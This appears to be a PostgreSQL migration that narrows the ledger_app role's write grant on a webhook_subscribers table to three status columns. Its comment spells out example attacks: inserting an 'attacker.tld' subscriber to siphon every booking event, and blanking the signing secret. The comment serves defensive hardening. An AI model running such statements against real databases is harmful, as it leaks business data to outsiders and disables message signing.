-- Closes the write-side twin of the ledger_ro secret-read finding migration
-- 007 fixed for reads (2026-08-29 security review, M-3). 001_baseline's grant
-- loop classifies webhook_subscribers as non-append-only (it carries no
-- ledger_block_mutation trigger) and therefore hands ledger_app a table-level
-- GRANT SELECT, INSERT, UPDATE. Under this repo's stated threat model (the
-- ledger_app credential is assumed leaked), that table-level write is three
-- attacks the application never needs:
--
--   1. INSERT INTO webhook_subscribers (url, is_active) VALUES ('https://
--      attacker.tld', true) -- every booking-transition event then streams to
--      the attacker (matchSubscribers defaults to "match all").
--   3. UPDATE ... SET secret = '' -- outbound delivery silently degrades to
--      unsigned (service/delivery/webhook.go only signs when secret != '').
--
-- The application's ONLY runtime write to this table is
-- UpdateWebhookSubscriberDeliveryStatus, which touches last_status_code /
-- last_error / last_attempt_at (postgres/webhook_subscriber_store.go's
-- RecordDeliveryStatus). InsertWebhookSubscriber / DeleteWebhookSubscriber
-- have zero production callers -- subscriber lifecycle belongs to an operator
-- channel (ledger_owner / migrations), not to ledger_app. So the write grant
-- is narrowed to exactly the three status columns.
--
-- NOT closed here (attack #2, SELECT secret): outbound delivery must read
-- secret to sign, so ledger_app keeps SELECT including the secret column.
-- Removing that requires moving webhook secrets out of the database entirely
-- (the same "key never enters the database" principle core.Attestor already
-- follows), which is a design change tracked separately, not a grant tweak.
REVOKE INSERT, UPDATE ON public.webhook_subscribers FROM ledger_app;
GRANT UPDATE (last_status_code, last_error, last_attempt_at)
    ON public.webhook_subscribers TO ledger_app;
